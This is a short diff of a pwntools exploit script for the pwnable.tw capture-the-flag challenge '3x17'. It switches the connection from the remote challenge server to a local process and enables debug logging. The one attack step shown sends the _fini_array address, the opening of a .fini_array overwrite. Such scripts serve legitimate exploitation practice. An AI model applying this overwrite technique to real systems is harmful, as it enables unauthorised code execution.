@@ -1,8 +1,8 @@
 from pwn import *
 
-#context.log_level="debug"
-#p=process("3x17")
-p=remote("chall.pwnable.tw",10105)
+context.log_level="debug"
+p=process("3x17")
+#p=remote("chall.pwnable.tw",10105)
 
 #_fini_array
 p.sendlineafter("addr:",str(0x4b40f0))
